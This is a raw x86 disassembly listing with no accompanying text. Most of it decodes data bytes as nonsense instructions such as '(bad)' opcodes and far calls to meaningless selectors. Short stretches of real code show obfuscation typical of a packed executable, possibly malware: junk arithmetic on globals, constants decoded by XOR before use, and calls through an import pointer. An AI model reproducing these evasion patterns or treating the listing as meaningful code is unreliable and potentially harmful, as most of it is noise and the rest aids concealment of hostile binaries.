  4063be:	dec    esi
  4063bf:	dec    DWORD PTR [edi+0x37ea1a5e]
  4063c5:	call   0xa24:0x36e5ec39
  4063cc:	jecxz  0x40642f
  4063ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cf:	push   esp
  4063d0:	cwde   
  4063d1:	mov    edi,0x4cc208a7
  4063d6:	inc    esi
  4063d7:	ins    DWORD PTR es:[edi],dx
  4063d8:	test   al,0xf1
  4063da:	call   0xf604:0x6e88c241
  4063e1:	sbb    al,0xea
  4063e3:	leave  
  4063e4:	jmp    esi
  4063e6:	pop    esi
  4063e7:	adc    cl,ch
  4063e9:	cld    
  4063ea:	mov    al,ds:0x66e89a36
  4063ef:	and    BYTE PTR [edx+0x7b761d73],al
  4063f5:	and    BYTE PTR [ebx-0x25],bl
  4063f8:	sahf   
  4063f9:	test   eax,0xe6e138f
  4063fe:	and    eax,0x4130d6db
  406403:	cmp    al,0x2
  406405:	mov    ds:0xaaac5637,eax
  40640a:	(bad)  
  40640b:	outs   dx,DWORD PTR ds:[esi]
  40640c:	retf   0xfb47
  40640f:	add    ebp,DWORD PTR [ebp+0x72]
  406412:	adc    ebp,DWORD PTR [ecx+0x7b]
  406415:	jmp    0x979a:0x2241bb23
  40641c:	frstor [ebx]
  40641e:	das    
  40641f:	xchg   edx,eax
  406420:	jb     0x406401
  406422:	sub    al,0x5a
  406424:	std    
  406425:	lock jae 0x406430
  406428:	iret   
  406429:	mov    ecx,0x71bfdd07
  40642e:	aam    0x96
  406430:	lods   al,BYTE PTR ds:[esi]
  406431:	xor    ebx,DWORD PTR [esi+edi*8-0x3569f3c8]
  406438:	inc    esi
  406439:	enter  0x23d3,0xe1
  40643d:	ja     0x406428
  40643f:	fimul  DWORD PTR [edi-0x62]
  406442:	adc    al,0x14
  406444:	mov    edi,0xe0458923
  406449:	xor    DWORD PTR ds:0x434286,0x4325f4
  406453:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432ce2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43429a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432ce2,0x4325f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4325f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432cd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4325ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43432d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4325f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432cd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43428e,0x434315
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434286,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432cbe,0x432ce6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434311,0x43431d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434286,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43429a,0x4325fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fistp  WORD PTR [edx+0x6b1445c7]
  40655d:	ds jo  0x4065d0
  406560:	and    BYTE PTR [ebp+0x70],bh
  406563:	jo     0x4065e3
  406565:	out    dx,al
  406566:	(bad)  
  406567:	sub    edx,ecx
  406569:	push   0x35
  40656b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40656c:	repnz sti 
  40656e:	mov    DWORD PTR [ecx+eiz*4],edi
  406571:	push   es
  406572:	xchg   edi,eax
  406573:	fidivr WORD PTR [ebp-0x1d]
  406576:	pop    ecx
  406577:	jb     0x4065e0
  406579:	je     0x406557
  40657b:	jo     0x40656a
  40657d:	enter  0xce79,0xf5
  406581:	stc    
  406582:	push   eax
  406583:	loop   0x4065f5
  406585:	dec    eax
  406586:	out    0xbb,al
  406588:	add    al,0xe4
  40658a:	inc    edx
  40658b:	mov    ebx,0xf7ada7ec
  406590:	pop    es
  406591:	add    bh,dl
  406593:	stos   BYTE PTR es:[edi],al
  406594:	sub    eax,0xfc369841
  406599:	cmp    eax,0xc8c71d8
  40659e:	jp     0x4065ee
  4065a0:	aam    0x76
  4065a2:	jne    0x40654b
  4065a4:	mov    eax,0xcec00105
  4065a9:	outs   dx,DWORD PTR ds:[esi]
  4065aa:	mov    BYTE PTR ds:0x97ac63ef,bh
  4065b0:	inc    ebp
  4065b1:	ins    BYTE PTR es:[edi],dx
  4065b2:	push   ss
  4065b3:	pop    ebx
  4065b4:	bound  ebp,QWORD PTR [ebx+0x61]
  4065b7:	out    dx,eax
  4065b8:	mov    ebp,0x22fbdb83
  4065bd:	das    
  4065be:	pop    ebx
  4065bf:	xor    eax,0xef07104
  4065c4:	adc    ch,dh
  4065c6:	stos   DWORD PTR es:[edi],eax
  4065c7:	push   es
  4065c8:	mov    edx,0x3eafe1e1
  4065cd:	ins    DWORD PTR es:[edi],dx
  4065ce:	data16 loope 0x40655e
  4065d1:	out    0x99,al
  4065d3:	sahf   
  4065d4:	add    BYTE PTR [edi+ebp*1],bh
  4065d7:	mov    ds:0x158cccb,eax
  4065dc:	or     dh,al
  4065de:	retf   
  4065df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e0:	mov    al,0x93
  4065e2:	mov    esp,0x986bf107
  4065e7:	and    DWORD PTR [ebx-0x25],ecx
  4065ea:	mov    cl,0xec
  4065ec:	lods   al,BYTE PTR ds:[esi]
  4065ed:	in     al,0x5c
  4065ef:	add    eax,DWORD PTR gs:[ebp+0x3a2703c3]
  4065f6:	dec    esi
  4065f7:	inc    edx
  4065f8:	xchg   BYTE PTR [edx-0x43],ah
  4065fb:	push   edx
  4065fc:	add    bh,ch
  4065fe:	call   0xb106:0x7ec78e72
  406605:	xchg   esi,eax
  406606:	retf   0x7323
  406609:	adc    BYTE PTR [edx+0x67],bh
  40660c:	aaa    
  40660d:	sub    eax,0xdf9cfc1f
  406612:	jns    0x4065c5
  406614:	push   cs
  406615:	add    al,0x1b
  406617:	xlat   BYTE PTR ds:[ebx]
  406618:	shr    cl,0x55
  40661b:	les    edx,FWORD PTR [ecx-0x3e978717]
  406621:	inc    eax
  406622:	cmp    al,0x26
  406624:	test   eax,0x5e6c9946
  406629:	daa    
  40662a:	arpl   WORD PTR [esi-0x72d42176],di
  406630:	fld    DWORD PTR [eax+edx*4]
  406633:	test   DWORD PTR [eax],ecx
  406635:	mov    dl,0xe0
  406637:	cld    
  406638:	cld    
  406639:	cmp    ch,0x81
  40663c:	sbb    BYTE PTR [edi-0x42],ch
  40663f:	pop    ds
  406640:	and    eax,0xf70e8d3f
  406645:	repnz mov ch,0xbe
  406648:	jno    0x406637
  40664a:	or     eax,DWORD PTR [ebx-0x14bf7944]
  406650:	sub    eax,0xad9d3565
  406655:	push   ebp
  406656:	inc    ebx
  406657:	dec    eax
  406658:	les    edi,FWORD PTR [ebp-0x76]
  40665b:	pop    esi
  40665c:	push   ss
  40665d:	mov    dh,0xc6
  40665f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406660:	xor    DWORD PTR [ebp-0x31],eax
  406663:	pop    ebp
  406664:	int3   
  406665:	pop    eax
  406666:	or     eax,0xf9dc9d56
  40666b:	jecxz  0x406692
  40666d:	fisub  WORD PTR [esi]
  40666f:	add    dh,BYTE PTR [ebp+ebx*2+0x5f]
  406673:	and    ebp,0xd0241714
  406679:	lea    edi,[edi+0x59f9a7da]
  40667f:	mov    esi,0xb9569ed0
  406684:	scas   eax,DWORD PTR es:[edi]
  406685:	cli    
  406686:	fst    DWORD PTR [ecx-0x1]
  406689:	push   ecx
  40668a:	retf   
  40668b:	pusha  
  40668c:	pop    esp
  40668d:	adc    ecx,ecx
  40668f:	rol    DWORD PTR [ebp+0x9],cl
  406692:	iret   
  406693:	mov    bh,0x5f
  406695:	sbb    cl,0x48
  406698:	lods   al,BYTE PTR ds:[esi]
  406699:	mov    edx,0xc7437b35
  40669e:	mov    ch,0xae
  4066a0:	pushf  
  4066a1:	adc    BYTE PTR ss:[esi-0x5f],bh
  4066a5:	mov    ebp,0xad24cf63
  4066aa:	adc    eax,0xc730d317
  4066af:	mov    ebx,0x18b32168
  4066b4:	call   0xb700:0xc064e69d
  4066bb:	xor    dl,bh
  4066bd:	cli    
  4066be:	jp     0x4066e7
  4066c0:	das    
  4066c1:	inc    esp
  4066c2:	int3   
  4066c3:	jecxz  0x40667e
  4066c5:	xlat   BYTE PTR ds:[ebx]
  4066c6:	or     edi,edx
  4066c8:	mov    al,ds:0xadcc8213
  4066cd:	xchg   edi,eax
  4066ce:	lods   al,BYTE PTR ds:[esi]
  4066cf:	pop    eax
  4066d0:	call   0xa7f84732
  4066d5:	sbb    ch,BYTE PTR [eax-0x5]
  4066d8:	add    DWORD PTR [ecx-0xa],eax
  4066db:	xchg   ecx,eax
  4066dc:	cmp    BYTE PTR [edx-0x60d547ad],0xaa
  4066e3:	ds test al,0x82
  4066e6:	sub    edi,DWORD PTR [ecx+edx*1-0x1f4f74c6]
  4066ed:	int    0x82
  4066ef:	push   edi
  4066f0:	jmp    0xe64b:0x94f5f8f8
  4066f7:	je     0x40673b
  4066f9:	jecxz  0x4066c5
  4066fb:	xchg   ebx,eax
  4066fc:	fnstenv [eax-0x11e9bb8f]
  406702:	ss dec ebp
  406704:	cdq    
  406705:	ins    BYTE PTR es:[edi],dx
  406706:	sub    BYTE PTR [ecx+0x7],dh
  406709:	arpl   WORD PTR ds:0xc9f446d6,bp
  40670f:	jmp    0x2cd09e88
  406714:	dec    ebx
  406715:	aam    0x50
  406717:	inc    ebp
  406718:	xor    esi,DWORD PTR [ebx-0x2be053a3]
  40671e:	pop    ss
  40671f:	dec    esp
  406720:	dec    esp
  406721:	sbb    eax,esp
  406723:	pop    esi
  406724:	int    0xda
  406726:	in     eax,0x31
  406728:	or     BYTE PTR [ebx],ch
  40672a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40672b:	xor    DWORD PTR [ebx-0x21],ebp
  40672e:	mov    edx,0x55a7b596
  406733:	pop    ds
  406734:	je     0x406704
  406736:	outs   dx,DWORD PTR ds:[si]
  406738:	div    ebx
  40673a:	test   WORD PTR [esi+0x74],ax
  40673e:	repnz xchg esp,eax
  406740:	loopne 0x40673d
  406742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406743:	ins    BYTE PTR es:[edi],dx
  406744:	fcmovne st,st(5)
  406746:	pop    esi
  406747:	pusha  
  406748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406749:	dec    ebp
  40674a:	and    dl,BYTE PTR ds:0x4bc68b45
  406750:	xor    dh,dh
  406752:	in     eax,0xa1
  406754:	mov    ds:0x821e56c,eax
  406759:	sub    ah,cl
  40675b:	inc    edx
  40675c:	or     al,0x6
  40675e:	or     eax,esi
  406760:	xchg   esp,eax
  406761:	mov    cl,0xb7
  406763:	dec    eax
  406764:	div    DWORD PTR [ecx]
  406766:	mov    eax,ds:0x957c8c99
  40676b:	cmp    DWORD PTR [edx],ecx
  40676d:	outs   dx,DWORD PTR ds:[esi]
  40676e:	fdiv   st(4),st
  406770:	popf   
  406771:	ret    0x2a82
  406774:	pop    ebp
  406775:	mov    DWORD PTR [eax+edi*2+0x36fefd40],edx
  40677c:	cdq    
  40677d:	int    0x46
  40677f:	in     al,0xd5
  406781:	daa    
  406782:	sbb    ebx,0x6210d42b
  406788:	adc    eax,0x3ff7aff9
  40678d:	fnstenv [ebx+0x13]
  406790:	xchg   ebx,eax
  406791:	je     0x40674a
  406793:	dec    esi
  406794:	xchg   DWORD PTR [ecx+ebp*4],edi
  406797:	bound  ebx,QWORD PTR [edx-0x13]
  40679a:	clc    
  40679b:	xor    esp,esp
  40679d:	iret   
  40679e:	pop    esi
  40679f:	mov    ds:0x77c204d0,al
  4067a4:	pop    es
  4067a5:	or     al,0xd
  4067a7:	mov    esp,ebx
  4067a9:	bound  ebp,QWORD PTR [edi+edx*4]
  4067ac:	dec    esp
  4067ad:	scas   eax,DWORD PTR es:[edi]
  4067ae:	int3   
  4067af:	inc    esi
  4067b0:	xchg   esi,eax
  4067b1:	mov    eax,ds:0xa0745294
  4067b6:	(bad)  [edi+0x28ca691f]
  4067bc:	dec    eax
  4067bd:	ss sub al,0xd1
  4067c0:	xor    BYTE PTR [esi+0x581a61ff],dh
  4067c6:	inc    esi
  4067c7:	and    dl,BYTE PTR [edi]
  4067c9:	sbb    cl,BYTE PTR [edi-0x22]
  4067cc:	pop    edx
  4067cd:	jp     0x406809
  4067cf:	xchg   esi,eax
  4067d0:	dec    ecx
  4067d1:	pop    ecx
  4067d2:	push   edx
  4067d3:	cld    
  4067d4:	outs   dx,BYTE PTR ds:[esi]
  4067d5:	or     ecx,DWORD PTR [edi]
  4067d7:	add    BYTE PTR [edx+0xffdaa4f],0x43
  4067de:	adc    BYTE PTR [ecx+0x68b29f39],dh
  4067e4:	adc    BYTE PTR [ebx-0x7a03053c],dl
  4067ea:	sti    
  4067eb:	sahf   
  4067ec:	not    BYTE PTR [ebx]
  4067ee:	push   ecx
  4067ef:	sub    esi,DWORD PTR ds:0x8625a6ae
  4067f5:	mov    esp,edi
  4067f7:	mov    bl,0x41
  4067f9:	dec    edx
  4067fa:	and    eax,DWORD PTR [esi]
  4067fc:	push   ebp
  4067fd:	test   DWORD PTR [ebx+0x77],eax
  406800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406801:	in     al,0x71
  406803:	test   eax,0x63cfc92
  406808:	hlt    
  406809:	les    edi,FWORD PTR [edi+0x1f]
  40680c:	ins    DWORD PTR es:[edi],dx
  40680d:	jns    0x406790
  40680f:	jl     0x4067e3
  406811:	xchg   esi,eax
  406812:	and    DWORD PTR [eax+0x147aa44b],ebp
  406818:	in     al,0x12
  40681a:	call   0x55a3:0xc6e75c2b
  406821:	mov    edx,0x2d54d646
  406826:	add    al,BYTE PTR [edi-0x82427]
  40682c:	jb     0x406890
  40682e:	retf   
  40682f:	mov    ebp,0xe262253c
  406834:	in     al,0x91
  406836:	pop    ecx
  406837:	mov    WORD PTR [ebx-0x164f4a5a],ss
  40683d:	or     ah,0x66
  406840:	pop    ebp
  406841:	shl    DWORD PTR [eax+esi*1-0x15],0x35
  406846:	call   0x135bd53
  40684b:	dec    ecx
  40684c:	mov    esi,0x46ad59e6
  406851:	dec    ebp
  406852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406853:	loopne 0x40689a
  406855:	mov    ds:0xc4af370a,eax
  40685a:	push   ebx
  40685b:	call   0xc229:0x7720290d
  406862:	aas    
  406863:	adc    BYTE PTR [ecx+0x70],al
  406866:	jno    0x406834
  406868:	xchg   DWORD PTR [esi-0x73d18d1],eax
  40686e:	fs repz addr16 aaa 
  406872:	cmp    al,0x33
  406874:	add    DWORD PTR [ecx],esi
  406876:	or     eax,0xde3cb896
  40687b:	adc    al,0xb0
  40687d:	repnz cmp DWORD PTR [esi+esi*4+0x4a],esi
  406882:	ret    
  406883:	xchg   esp,eax
  406884:	aaa    
  406885:	inc    esp
  406886:	mov    ch,0x3e
  406888:	cld    
  406889:	stos   DWORD PTR es:[edi],eax
  40688a:	loopne 0x4068be
  40688c:	sub    DWORD PTR [ebx-0x38919e4c],edi
  406892:	scas   eax,DWORD PTR es:[edi]
  406893:	xor    BYTE PTR [ebp+0x2505c7c0],al
  406899:	inc    ebx
  40689a:	inc    ebx
  40689b:	add    BYTE PTR [ecx+0x79],dh
  40689e:	add    BYTE PTR [eax],al
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432cca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432ce6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432ce2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434266,0x11
  4068da:	cmp    DWORD PTR ds:0x434266,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434266,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434321
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432b3a
  40690c:	cmp    DWORD PTR ds:0x434266,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434266
  40691e:	dec    eax
  40691f:	mov    ds:0x434266,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434266
  40692c:	dec    eax
  40692d:	mov    ds:0x434266,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	clc    
  406990:	cs retf 0x1b59
  406994:	cmp    dh,BYTE PTR [eax+0x70]
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406946
  40699c:	aas    
  40699d:	into   
  40699e:	leave  
  40699f:	lahf   
  4069a0:	fwait
  4069a1:	das    
  4069a2:	arpl   WORD PTR gs:[ecx-0x70],cx
  4069a6:	sbb    BYTE PTR [ecx+0x334ef6c4],bl
  4069ac:	dec    ebx
  4069ad:	and    bl,BYTE PTR [ecx]
  4069af:	inc    ebx
  4069b0:	xor    BYTE PTR [ecx],bl
  4069b2:	cmp    al,0xe9
  4069b4:	enter  0x875e,0xdb
  4069b8:	loop   0x4069f6
  4069ba:	cmp    ebx,ebx
  4069bc:	es inc ebx
  4069be:	xor    al,0x1
  4069c0:	cli    
  4069c1:	cmc    
  4069c2:	or     al,0xaa
  4069c4:	dec    ebx
  4069c5:	pop    eax
  4069c6:	xchg   ebp,eax
  4069c7:	ins    BYTE PTR es:[edi],dx
  4069c8:	rol    DWORD PTR [eax+0x72],cl
  4069cb:	cmp    eax,0xda197bdd
  4069d0:	push   cs
  4069d1:	sar    DWORD PTR [ebp+0x66c7d68b],cl
  4069d7:	test   eax,0xb88ca978
  4069dc:	out    dx,eax
  4069dd:	jecxz  0x406976
  4069df:	inc    ecx
  4069e0:	dec    edi
  4069e1:	test   eax,0x60fc5959
  4069e6:	mov    eax,ds:0x3dec0ea7
  4069eb:	and    DWORD PTR [edi+0x30],0xcabfb9c2
  4069f2:	dec    esp
  4069f3:	jl     0x406a29
  4069f5:	pop    ebp
  4069f6:	jg     0x40697e
  4069f8:	mov    ecx,0xdb5ff9a2
  4069fd:	fs ret 
  4069ff:	ins    BYTE PTR es:[edi],dx
  406a00:	mov    bh,0x2f
  406a02:	ss popf 
  406a04:	xchg   BYTE PTR [esi+ecx*8-0x29f95787],cl
  406a0b:	jle    0x4069ae
  406a0d:	cs mov ebp,0xa255f1d1
  406a13:	adc    BYTE PTR [ebp+0xf],0x30
  406a17:	imul   ecx,DWORD PTR [edx+0x2ce4e319],0x3cc5fe04
  406a21:	jle    0x406a70
  406a23:	icebp  
  406a24:	mov    ds:0xfab00346,al
  406a29:	popa   
  406a2a:	out    0x43,eax
  406a2c:	add    BYTE PTR [edx+edi*4+0x747621e3],bl
  406a33:	sti    
  406a34:	sbb    eax,DWORD PTR [edx+edi*8+0x7a]
  406a38:	pop    ebp
  406a39:	int    0x37
  406a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a3c:	jbe    0x406a2a
  406a3e:	add    DWORD PTR [edi],ebx
  406a40:	mov    eax,0x62bd423c
  406a45:	rcr    BYTE PTR [ebp-0x6fef25a5],1
  406a4b:	call   0xd7b6b6dc
  406a50:	loopne 0x406abb
  406a52:	cmp    esi,DWORD PTR [ebx+0x19b34bfc]
  406a58:	fcom   QWORD PTR [ecx+0x6d283e78]
  406a5e:	and    al,BYTE PTR [ebx-0x2f]
  406a61:	push   es
  406a62:	pop    ebx
  406a63:	xor    eax,0xe1157d57
  406a68:	push   esp
  406a69:	lahf   
  406a6a:	mov    ds:0xbe33b050,al
  406a6f:	in     eax,0x8a
  406a71:	cmp    al,0x39
  406a73:	and    al,0x9
  406a75:	imul   DWORD PTR [ebx-0x27179b16]
  406a7b:	outs   dx,BYTE PTR ds:[esi]
  406a7c:	jmp    0x79c33eba
  406a81:	sub    dl,BYTE PTR [esi]
  406a83:	loop   0x406a3e
  406a85:	mov    ebp,0xb1e13584
  406a8a:	sub    al,0x75
  406a8c:	mov    edx,0xb35c1ea2
  406a91:	icebp  
  406a92:	xchg   esi,eax
  406a93:	xchg   esi,eax
  406a94:	(bad)  
  406a95:	dec    edi
  406a96:	xlat   BYTE PTR ds:[ebx]
  406a97:	mov    cl,0xcf
  406a99:	jmp    0x660d2b24
  406a9e:	mov    ch,0xd6
  406aa0:	aad    0xd9
  406aa2:	int    0x7c
  406aa4:	fild   DWORD PTR [ecx-0x28]
  406aa7:	pop    esi
  406aa8:	xor    BYTE PTR [ecx],cl
  406aaa:	mov    esi,DWORD PTR [esi-0x732dbf05]
  406ab0:	lds    ebx,FWORD PTR [ecx-0xe]
  406ab3:	aad    0xe5
  406ab5:	mov    al,ds:0xde9a880e
  406aba:	add    al,0xd3
  406abc:	sub    BYTE PTR [ebx-0x1f4d84e],bl
  406ac2:	aad    0xc2
  406ac4:	mov    dh,0xa
  406ac6:	sbb    esp,DWORD PTR [edx+ecx*1-0x1a5fcced]
  406acd:	loope  0x406af6
  406acf:	in     al,dx
  406ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ad1:	add    al,dl
  406ad3:	sub    BYTE PTR [edx+0x59],al
  406ad6:	outs   dx,BYTE PTR ds:[esi]
  406ad7:	imul   DWORD PTR [ebp-0x40]
  406ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406adb:	mov    ch,0x54
  406add:	cmp    al,bh
  406adf:	mov    al,0x5c
  406ae1:	out    dx,eax
  406ae2:	xor    al,0xe
  406ae4:	loop   0x406b1d
  406ae6:	hlt    
  406ae7:	das    
  406ae8:	cmp    BYTE PTR [eax+0x677adad9],bl
  406aee:	add    ah,0x49
  406af1:	es pop esp
  406af3:	cwde   
  406af4:	cmp    BYTE PTR [edi+0xa5956e1],ah
  406afa:	sub    DWORD PTR [ecx-0x18],edi
  406afd:	scas   al,BYTE PTR es:[edi]
  406afe:	addr16 pop esp
  406b00:	ss dec ebx
  406b02:	ins    BYTE PTR es:[edi],dx
  406b03:	out    dx,al
  406b04:	jecxz  0x406b4c
  406b06:	nop
  406b07:	mov    WORD PTR [ebx+edx*2],ss
  406b0a:	push   edx
  406b0b:	lds    edx,FWORD PTR [edx-0x2716d380]
  406b11:	shl    DWORD PTR [edi],0x4e
  406b14:	sahf   
  406b15:	dec    ecx
  406b16:	adc    eax,eax
  406b18:	lods   al,BYTE PTR ds:[esi]
  406b19:	ins    DWORD PTR es:[edi],dx
  406b1a:	icebp  
  406b1b:	and    ebx,DWORD PTR [ebp-0x25789ac3]
  406b21:	xchg   esi,eax
  406b22:	fwait
  406b23:	xchg   esi,eax
  406b24:	sub    DWORD PTR [edi-0x574db3c3],edx
  406b2a:	mov    cl,0xb7
  406b2c:	sbb    bl,BYTE PTR [ebx-0x2156cad9]
  406b32:	out    dx,eax
  406b33:	ret    0xe373
  406b36:	in     eax,dx
  406b37:	fadd   QWORD PTR [ebp+0x67]
  406b3a:	jle    0x406ba1
  406b3c:	and    DWORD PTR [ebx],0x7b39ba27
  406b42:	jecxz  0x406b6d
  406b44:	jmp    0x42c7:0x69c37c2a
  406b4b:	lea    eax,[esi]
  406b4d:	into   
  406b4e:	mov    ecx,0x95e68440
  406b53:	or     al,0x6e
  406b55:	xchg   edi,eax
  406b56:	ja     0x406b61
  406b58:	xor    ebx,DWORD PTR [ecx]
  406b5a:	(bad)  
  406b5b:	sti    
  406b5c:	dec    ebx
  406b5d:	sbb    DWORD PTR [esi+0x38],ebx
  406b60:	or     al,0x7
  406b62:	fs repnz push 0x66
  406b66:	rcl    BYTE PTR [edx],cl
  406b68:	and    DWORD PTR [ecx+0x71],0xfffffffc
  406b6c:	aas    
  406b6d:	int    0xba
  406b6f:	pop    esp
  406b70:	mov    ebx,DWORD PTR ds:0xbd7f5556
  406b76:	sub    BYTE PTR [ecx-0x35],ch
  406b79:	inc    ecx
  406b7a:	cwde   
  406b7b:	cmp    al,0xaa
  406b7d:	add    eax,0xf657868
  406b82:	sub    bh,BYTE PTR [ebx+0x7c]
  406b85:	sbb    eax,0xfabf7091
  406b8a:	clc    
  406b8b:	std    
  406b8c:	xor    DWORD PTR [ebx-0x5f3bf3c6],eax
  406b92:	and    eax,0x3a08411a
  406b97:	lock jmp 0x360deb77
  406b9d:	ret    
  406b9e:	pop    edi
  406b9f:	adc    eax,0xb86beb10
  406ba4:	push   0x4a1ec605
  406ba9:	dec    eax
  406baa:	icebp  
  406bab:	mulps  xmm4,XMMWORD PTR [edi]
  406bae:	in     eax,0x67
  406bb0:	stos   DWORD PTR es:[edi],eax
  406bb1:	retf   
  406bb2:	popa   
  406bb3:	into   
  406bb4:	lods   eax,DWORD PTR ds:[esi]
  406bb5:	sub    BYTE PTR [ecx-0x30d2b55],bl
  406bbb:	sub    al,0xa3
  406bbd:	cmp    DWORD PTR [ecx-0x23],0xffffff81
  406bc1:	leave  
  406bc2:	xchg   edx,eax
  406bc3:	mov    WORD PTR [esp+ebp*4-0x30],cs
  406bc7:	jo     0x406c31
  406bc9:	jmp    0x4ba97483
  406bce:	push   edi
  406bcf:	shl    DWORD PTR [esp+ebp*4+0x440c74b8],cl
  406bd6:	pop    ebx
  406bd7:	(bad)  
  406bd8:	fwait
  406bd9:	sbb    eax,0x2564350c
  406bde:	out    0x95,al
  406be0:	mov    eax,0xc413336d
  406be5:	push   0x4c
  406be7:	lods   eax,DWORD PTR ds:[esi]
  406be8:	cmc    
  406be9:	add    cl,ah
  406beb:	lods   eax,DWORD PTR ds:[esi]
  406bec:	adc    eax,0x1cd03470
  406bf1:	add    BYTE PTR [ebp-0x3829f7a],bh
  406bf7:	mov    esp,0xc58dce72
  406bfc:	cwde   
  406bfd:	inc    eax
  406bfe:	ror    BYTE PTR [ecx],1
  406c00:	popa   
  406c01:	push   ebp
  406c02:	es push ecx
  406c04:	stc    
  406c05:	ins    BYTE PTR es:[edi],dx
  406c06:	inc    edi
  406c07:	mov    ah,0xe6
  406c09:	mov    al,0xb5
  406c0b:	test   al,0x1c
  406c0d:	push   ss
  406c0e:	push   ds
  406c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c10:	pushf  
  406c11:	adc    DWORD PTR [ebx],edx
  406c13:	cs clc 
  406c15:	or     al,0x69
  406c17:	and    DWORD PTR [eax+0x2a],ebx
  406c1a:	in     al,0x40
  406c1c:	add    ah,cl
  406c1e:	and    DWORD PTR [ebx],0xffffffbe
  406c21:	clc    
  406c22:	xchg   esi,eax
  406c23:	adc    al,0xd0
  406c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c26:	mov    ds:0xab61e136,eax
  406c2b:	loopne 0x406c53
  406c2d:	fld    DWORD PTR [ebx+0x4f]
  406c30:	les    eax,FWORD PTR [ecx]
  406c32:	lods   al,BYTE PTR ds:[esi]
  406c33:	push   ss
  406c34:	push   edi
